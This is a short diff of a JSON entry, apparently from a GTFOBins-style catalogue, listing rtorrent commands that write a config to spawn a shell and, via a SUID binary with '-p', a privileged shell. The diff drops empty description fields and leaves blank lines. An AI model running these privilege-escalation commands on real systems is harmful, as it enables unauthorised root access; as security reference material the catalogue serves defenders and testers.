@@ -2,13 +2,13 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "echo \"execute = /bin/sh,-c,\\\"/bin/sh <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\nrtorrent\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
       }
     ]
